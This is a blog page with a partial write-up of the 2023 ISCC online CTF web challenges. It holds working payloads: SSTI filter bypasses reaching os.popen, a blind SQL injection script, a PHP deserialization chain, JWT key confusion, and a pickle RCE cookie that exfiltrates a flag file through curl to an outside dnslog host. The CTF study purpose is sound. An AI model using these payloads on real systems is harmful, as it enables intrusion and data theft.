<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>2023线上ISCC部分WP | simple blog</title><meta name="keywords" content="����"><meta name="author" content="dwb"><meta name="copyright" content="dwb"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Web羊了个羊通过网址打开游戏界面，发现鼠标右键失灵，无法直接打开页面源代码。随意打开一个已知页面的源代码，发现有view-source:字样，在游戏界面的网址前加上view-sourc:打开页面源代码。发现一串字符使用base64加密解密后是个假的flag有两个可打开文件，flag肯定在这两个中打开index.css文件未发现任何东西故接着打开另一个vue.global.js文件，文件内容很多，">
<meta property="og:type" content="article">
<meta property="og:title" content="2023线上ISCC部分WP">
<meta property="og:url" content="https://hzy2003628.top/2023/11/14/2023%E7%BA%BF%E4%B8%8AISCC%20%E9%83%A8%E5%88%86WP/index.html">
<meta property="og:site_name" content="simple blog">
<meta property="og:description" content="Web羊了个羊通过网址打开游戏界面，发现鼠标右键失灵，无法直接打开页面源代码。随意打开一个已知页面的源代码，发现有view-source:字样，在游戏界面的网址前加上view-sourc:打开页面源代码。发现一串字符使用base64加密解密后是个假的flag有两个可打开文件，flag肯定在这两个中打开index.css文件未发现任何东西故接着打开另一个vue.global.js文件，文件内容很多，">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
<meta property="article:published_time" content="2023-11-14T12:14:27.863Z">
<meta property="article:modified_time" content="2023-11-14T12:22:53.065Z">
<meta property="article:author" content="dwb">
<meta property="article:tag" content="����">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://hzy2003628.top/2023/11/14/2023%E7%BA%BF%E4%B8%8AISCC%20%E9%83%A8%E5%88%86WP/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '2023线上ISCC部分WP',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-11-14 20:22:53'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="simple blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="C:\Users\D\blog\themes\butterfly\source\img bear.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">simple blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2023线上ISCC部分WP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-14T12:14:27.863Z" title="发表于 2023-11-14 20:14:27">2023-11-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-14T12:22:53.065Z" title="更新于 2023-11-14 20:22:53">2023-11-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WP/">WP</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">16.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>89分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2023线上ISCC部分WP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="羊了个羊"><a href="#羊了个羊" class="headerlink" title="羊了个羊"></a>羊了个羊</h2><p>通过网址打开游戏界面，发现鼠标右键失灵，无法直接打开页面源代码。随意打开一个已知页面的源代码，发现有view-source:字样，在游戏界面的网址前加上view-sourc:打开页面源代码。<br>发现一串字符使用base64加密<img src="https://img-blog.csdnimg.cn/bc4c711ae33746fc9afd935487e7a1aa.png#pic_center" alt="在这里插入图片描述"><br>解密后是个假的flag<br><img src="https://img-blog.csdnimg.cn/7b92de71c5774fb68e5994e76aad722d.png#pic_center" alt="在这里插入图片描述"><br>有两个可打开文件，flag肯定在这两个中<br>打开index.css文件未发现任何东西<br>故接着打开另一个vue.global.js文件，文件内容很多，快捷键Ctrl+F全局搜索，发现base64字符串<br><img src="https://img-blog.csdnimg.cn/1bde4f5d6ba64a06ac5bab6fe6fe2b31.png#pic_center" alt="在这里插入图片描述"><br>经过两次base64解密得到正确的flag</p>
<h2 id="小周的密码锁"><a href="#小周的密码锁" class="headerlink" title="小周的密码锁"></a>小周的密码锁</h2><p>打开，按照规律多次尝试<br><img src="https://img-blog.csdnimg.cn/3ccea68945aa42f2a604094e3146623e.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/5235ca29bf884f2ba47c2c0eb1de24a1.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/484a705e6eab4d679cd6dcc6e45755ad.png#pic_center" alt="在这里插入图片描述"><br>发现后面的password2不会变，将其值改成5，得到代码<br><img src="https://img-blog.csdnimg.cn/e9c6e6c6996c42528caa991e9d8866b9.png#pic_center" alt="在这里插入图片描述"><br>发现有部分被遮挡，网页代码复制下来<br>构造payload：<br><a target="_blank" rel="noopener" href="http://47.94.14.162:10008/?password=%02!SCCNOTHARD&amp;username=14987637&amp;sha1=ncxvshadewjpz&amp;%E2%80%AE%E2%81%A6//sha2%E2%81%A9%E2%81%A6sha2=DFSNHPICAKYWV">http://47.94.14.162:10008/?password=%02!SCCNOTHARD&amp;username=14987637&amp;sha1=ncxvshadewjpz&amp;%E2%80%AE%E2%81%A6//sha2%E2%81%A9%E2%81%A6sha2=DFSNHPICAKYWV</a><br>得到结果</p>
<h2 id="老狼老狼几点了"><a href="#老狼老狼几点了" class="headerlink" title="老狼老狼几点了"></a>老狼老狼几点了</h2><p><img src="https://img-blog.csdnimg.cn/80e1da30985a4fd693dee6d3fe018bcb.png" alt="在这里插入图片描述"><br>首先跑出来是12点，跳转到guess_time.php文件去<br>接着审计代码第一步可以通过爆破未来值得到，提前用fastcoll生成两个以未来时间戳开头的相同md5的值<br><img src="https://img-blog.csdnimg.cn/fc1f582c1e1a4df5920aefea363d5163.png" alt="在这里插入图片描述"></p>
<pre><code class="hljs bash"><span class="hljs-variable">$a</span> = (file_get_contents(<span class="hljs-string">&quot;D:/WebApps/fastcoll/a1.txt&quot;</span>));
<span class="hljs-variable">$b</span> = (file_get_contents(<span class="hljs-string">&quot;D:/WebApps/fastcoll/a2.txt&quot;</span>));
<span class="hljs-built_in">echo</span> urlencode(<span class="hljs-variable">$a</span>).<span class="hljs-string">&quot;&quot;</span>;
<span class="hljs-built_in">echo</span> urlencode(<span class="hljs-variable">$b</span>).<span class="hljs-string">&quot;&quot;</span>;</code></pre>
<p><img src="https://img-blog.csdnimg.cn/8f85a05ee77c476bb1dac7dccd5c8a8e.png" alt="在这里插入图片描述"><br>接着extract变量覆盖绕过，可以看到这里的file和function的值是无法绕过的，但是我们可以通过base64过滤进行字符串逃逸，具体原理也比较简单<br>逃逸的payload：</p>
<pre><code class="hljs bash">_SESSION[a]=base64base64base64&amp;_SESSION[z]=a<span class="hljs-string">&quot;;s:8:&quot;</span><span class="hljs-keyword">function</span><span class="hljs-string">&quot;;s:4:&quot;</span>hack<span class="hljs-string">&quot;;s:4:&quot;</span>file<span class="hljs-string">&quot;;s:52:&quot;</span>php://filter/convert.basbase64e64-encode/resource=flag.php<span class="hljs-string">&quot;;s:4:&quot;</span>snow<span class="hljs-string">&quot;;s:4:&quot;</span>snow<span class="hljs-string">&quot;;&#125;</span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/2e6d0372825b4827be6b61b76f1f289b.png" alt="在这里插入图片描述"></p>
<h2 id="ChatGGG"><a href="#ChatGGG" class="headerlink" title="ChatGGG"></a>ChatGGG</h2><pre><code class="hljs plaintext">1. 发现fllaaag.txt
2. 网络响应发现服务端为WSGI，猜测有模板注入
3. 测试过滤内容：
    &#123;&#123;&#125;&#125;不能用
    使用&#123;%print()%&#125;
4. 输入&#123;%print(config)%&#125;查看配置
5. 构造payload
  (1)+.*_ class base globals等一大部分都被过滤了
  (2)~可以充当连接，使用&quot;&quot;[&quot;&quot;]代替.__
  (3)&#123;%print(&quot;&quot;[&quot;\x5f\x5fcla&quot;~&quot;ss\x5f\x5f&quot;][&quot;\x5F\x5Fba&quot;~&quot;se\x5F\x5F&quot;][&quot;\x5F\x5Fsubcla&quot;~&quot;sses\x5F\x5F&quot;]()[233][&quot;\x5F\x5Fin&quot;~&quot;it\x5F\x5F&quot;][&quot;\x5F\x5Fglo&quot;~&quot;bals\x5F\x5F&quot;][&quot;\x5F\x5Fbuil&quot;~&quot;tins\x5F\x5F&quot;][&quot;eval&quot;](&quot;\x5F\x5Fimpo&quot;~&quot;rt\x5F\x5F(\&quot;os\&quot;)&quot;)[&quot;popen&quot;](&quot;cat flllaag\x2etxt|bas&quot;~&quot;e64&quot;)[&quot;read&quot;]())%&#125;
  其中&quot;&quot;[&quot;\x5f\x5fcla&quot;~&quot;ss\x5f\x5f&quot;]=&gt;&quot;&quot;[&quot;__class__&quot;]=&gt;.__class__</code></pre>

<h2 id="ISCC疯狂购物节-1"><a href="#ISCC疯狂购物节-1" class="headerlink" title="ISCC疯狂购物节-1"></a>ISCC疯狂购物节-1</h2><p>此题考查的是like盲注<br>poc:</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time

url = <span class="hljs-string">&quot;http://47.94.14.162:10001/Details/search?id=&quot;</span>
cookies = &#123;&#125; <span class="hljs-comment">#换自己的</span>
headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://47.94.14.162:10001/Details/search?id=487561)||database()%20like%200x254325--%20-&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;X-Requested-With&quot;</span>: <span class="hljs-string">&quot;XMLHttpRequest&quot;</span>&#125;

chars=<span class="hljs-string">&#x27;&#123;&#125;.abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>
<span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> chars:
   payload=<span class="hljs-string">&quot;4875610)||fl4g like binary 0x257b&#123;0&#125;25#&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(char))[<span class="hljs-number">2</span>:])	<span class="hljs-comment">#改这里</span>
   <span class="hljs-built_in">print</span>(payload)
   time.sleep(<span class="hljs-number">2</span>)
   res=requests.get(url+payload, headers=headers, cookies=cookies)
   <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;fl4g&quot;</span> <span class="hljs-keyword">in</span> res.text:
      <span class="hljs-built_in">print</span>(char)
</code></pre>
<h2 id="Where-is-your-love"><a href="#Where-is-your-love" class="headerlink" title="Where_is_your_love"></a>Where_is_your_love</h2><p>F12控制台查看可找到loveStory.php  Enc.php download.php，loveStory.php为反序列源码。<br>boy::__destruct() –&gt;girl()::__call()–&gt;helper()::__isset()–&gt;boy()::__toString()–&gt;helper()::__get()–&gt;love_story()::__love()<br>在get()处使用数组调用类方法执行love函数。<br>传入</p>
<pre><code class="hljs php"><span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">love_story</span>(),<span class="hljs-string">&quot;love&quot;</span>)</code></pre>
<p>其中，love_story中使fall_in_love=[“girl_and_boy”]绕过if判断<br>poc:</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">boy</span> </span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$like</span>;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">girl</span> </span>&#123;
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$boyname</span>;
        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$boyname</span></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-variable language_">$this</span>-&gt;boyname=<span class="hljs-variable">$boyname</span>;
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$string</span></span>) </span>&#123;
        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">string</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;string&quot;</span>=&gt;<span class="hljs-variable">$string</span>);
    &#125;
&#125;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">love_story</span> </span>&#123;
&#125;


<span class="hljs-variable">$boy2</span>=<span class="hljs-keyword">new</span> boy;
<span class="hljs-variable">$love1</span>=<span class="hljs-keyword">new</span> love_story;
<span class="hljs-variable">$love1</span>-&gt;fall_in_love=[<span class="hljs-string">&quot;girl_and_boy&quot;</span>];
<span class="hljs-variable">$help2</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">helper</span>(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-variable">$love1</span>,<span class="hljs-string">&quot;love&quot;</span>));
<span class="hljs-variable">$boy2</span>-&gt;like=<span class="hljs-variable">$help2</span>;
<span class="hljs-variable">$help1</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">helper</span>(<span class="hljs-variable">$boy2</span>,<span class="hljs-string">&quot;dd&quot;</span>);
<span class="hljs-variable">$girl1</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">girl</span>(<span class="hljs-variable">$help1</span>);
<span class="hljs-variable">$boy1</span>=<span class="hljs-keyword">new</span> boy;
<span class="hljs-variable">$boy1</span>-&gt;like=<span class="hljs-variable">$girl1</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$boy1</span>));</code></pre>
<p>后面还有段解密<br><img src="https://img-blog.csdnimg.cn/084c4d24941d4f62a85d4c0fc173b202.png#pic_center" alt="在这里插入图片描述"></p>
<h2 id="上大号说话"><a href="#上大号说话" class="headerlink" title="上大号说话"></a>上大号说话</h2><p>.git 泄露部分源码</p>
<pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ED</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.file_key = ...  <span class="hljs-comment"># 1Aa 需要爆破的key</span>
        self.cipher_suite = Fernet(self.generate_key(self.file_key))    <span class="hljs-comment">#</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">crypto</span>(<span class="hljs-params">self, base_str</span>):
        <span class="hljs-keyword">return</span> self.cipher_suite.encrypt(base_str)

<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_key</span>(<span class="hljs-params">key: <span class="hljs-built_in">str</span></span>):
        key_byte = key.encode()
        <span class="hljs-keyword">return</span> base64.urlsafe_b64encode(key_byte + <span class="hljs-string">b&#x27;0&#x27;</span> * <span class="hljs-number">28</span>)


<span class="hljs-keyword">def</span> <span class="hljs-title function_">check_cookies</span>(<span class="hljs-params">cookie</span>):
    ed = ED()
    f, result = ed.decrypto(cookie)
    black_list = ...
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>] == <span class="hljs-string">b&#x27;\x80\x03&#x27;</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    ...
    <span class="hljs-keyword">try</span>:
        result = pickle.loads(result)
        <span class="hljs-keyword">if</span> result.name == <span class="hljs-string">&#x27;mabaoguo&#x27;</span> <span class="hljs-keyword">and</span> result.random == mabaoguo.random <span class="hljs-keyword">and</span> result.gongfu == mabaoguo.gongfu:
            <span class="hljs-keyword">return</span> flag
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> result.name
    <span class="hljs-keyword">except</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>


<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():
    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:
        name = request.form[<span class="hljs-string">&#x27;input_field&#x27;</span>]
        name = Member(name)
        name_pick = pickle.dumps(name, protocol=<span class="hljs-number">3</span>)
        name_pick = pickletools.optimize(name_pick)
        ed = ED()
        response = make_response(redirect(<span class="hljs-string">&#x27;/&#x27;</span>))
        response.set_cookie(<span class="hljs-string">&#x27;name&#x27;</span>, ed.crypto(name_pick).decode())
        <span class="hljs-keyword">return</span> response

    temp_cookies = request.cookies.get(<span class="hljs-string">&#x27;name&#x27;</span>)

    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> temp_cookies:
        ...
    <span class="hljs-keyword">else</span>:
        f = check_cookies(temp_cookies)
        ...


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    app.run()</code></pre>
<p>爆破密钥：<br>先在题目随便输入，再获得name对应的cookie<br>爆破脚本，字典为自己生成（数字+大小写字母组合），从短的开始</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> cryptography.fernet <span class="hljs-keyword">import</span> Fernet
<span class="hljs-keyword">import</span> base64

<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_key</span>(<span class="hljs-params">key: <span class="hljs-built_in">str</span></span>):
    key_byte = key.encode()
    <span class="hljs-keyword">return</span> base64.urlsafe_b64encode(key_byte + <span class="hljs-string">b&#x27;0&#x27;</span> * <span class="hljs-number">28</span>)
se=<span class="hljs-string">&quot;gAAAAABkV15w1YrpamSHnPltzjwB95JFnf-3G39PwVGEHn3bjIIq47b5R2GnjsCzdoNsXiz8dw-1zstfOR8Jpwl0xmem3AnaClnFyww3_aCI4SHEukDek6B2716T_tb-RW1a9Th0MTapMmawkgoQfRSAV6uGreqgHzKxmHqdAMoyxsRrMAAEpo4=&quot;</span>
dic=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;dic.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).readlines()
times=<span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:
    <span class="hljs-keyword">try</span>:
        key=generate_key(i.strip())
        fernet=Fernet(key)
        data=fernet.decrypt(se)
        times+=<span class="hljs-number">1</span>
        <span class="hljs-built_in">print</span>(data)
        <span class="hljs-built_in">print</span>(i)
        <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">except</span>:
        <span class="hljs-keyword">pass</span>
<span class="hljs-built_in">print</span>(times)
</code></pre>
<p>密钥：5MbG<br>再生成O指令RCE的cookie<br>poc：</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">from</span> json <span class="hljs-keyword">import</span> dump
<span class="hljs-keyword">from</span> enum <span class="hljs-keyword">import</span> member
<span class="hljs-keyword">from</span> cryptography.fernet <span class="hljs-keyword">import</span> Fernet

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ED</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.file_key = <span class="hljs-string">&#x27;5MbG&#x27;</span>
        self.cipher_suite = Fernet(self.generate_key(self.file_key))

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">crypto</span>(<span class="hljs-params">self, base_str</span>):
        <span class="hljs-keyword">return</span> self.cipher_suite.encrypt(base_str)
        
<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_key</span>(<span class="hljs-params">key: <span class="hljs-built_in">str</span></span>):
        key_byte = key.encode()
        <span class="hljs-keyword">return</span> base64.urlsafe_b64encode(key_byte + <span class="hljs-string">b&#x27;0&#x27;</span> * <span class="hljs-number">28</span>)

<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;curl `cat flagucjbgaxqef.txt`.l8s7sjd8.dnslog.pw&#x27;</span>)))
payload = <span class="hljs-string">b&#x27;\x80\x03(cos\nsystem\nX\x30\x00\x00\x00curl `cat flagucjbgaxqef.txt`.l8s7sjd8.dnslog.pwo.&#x27;</span>
payload1=<span class="hljs-string">b&#x27;\x80\x03capp\nMember\n)\x81&#125;(X\x04\x00\x00\x00nameX\x08\x00\x00\x00mabaoguoX\x06\x00\x00\x00randomcmabaoguo\nrandom\nX\x06\x00\x00\x00gongfucmabaoguo\ngongfu\nub.&#x27;</span>
<span class="hljs-comment">#flagucjbgaxqef.txt</span>
ed = ED()
cookie=ed.crypto(payload).decode()
<span class="hljs-built_in">print</span>(cookie)</code></pre>
<p>payload1为变量覆盖，获取flag的位置，payload为获取flag，payload中的DNSlog记得换为自己的。换上cookie刷新即可，在DNSlog等待回显，没有回显多尝试几次。</p>
<h2 id="ISCC内部零元购-2"><a href="#ISCC内部零元购-2" class="headerlink" title="ISCC内部零元购-2"></a>ISCC内部零元购-2</h2><p>题目漏洞为ssti模板注入，下载公钥文件，修改RS256为HS256，密钥混淆。</p>
<pre><code class="hljs sql">import jwt
      PUBLIC_KEY <span class="hljs-operator">=</span> <span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;key.txt&#x27;</span>).read()
      payload <span class="hljs-operator">=</span> &#123;
        &quot;name&quot;: &quot;&#123;&#123;cycler.__init__.__globals__.os.popen(&#x27;cat flag.txt&#x27;).read()&#125;&#125;&quot;,
        &quot;exp&quot;: <span class="hljs-number">9902085613</span>,  #失效时间，随便写就好
      &#125;
      header <span class="hljs-operator">=</span> &#123;
        &quot;Access_IP&quot;:&quot;10.15.6.211&quot;,
        &quot;alg&quot;: &quot;HS256&quot;,
        &quot;typ&quot;: &quot;JWT&quot;,
      &#125;
      encoded <span class="hljs-operator">=</span> jwt.encode(payload, PUBLIC_KEY, algorithm<span class="hljs-operator">=</span><span class="hljs-string">&#x27;HS256&#x27;</span>, headers<span class="hljs-operator">=</span>header)
      print(encoded)</code></pre>

<p>替换cookie中Auth值，并访问inner（内部商店）获取flag</p>
<h2 id="ISCC滥用职权-3"><a href="#ISCC滥用职权-3" class="headerlink" title="ISCC滥用职权-3"></a>ISCC滥用职权-3</h2><p>登录策划部，bp抓包修改大写字母，写脚本利用CBC反转来绕过认证。</p>
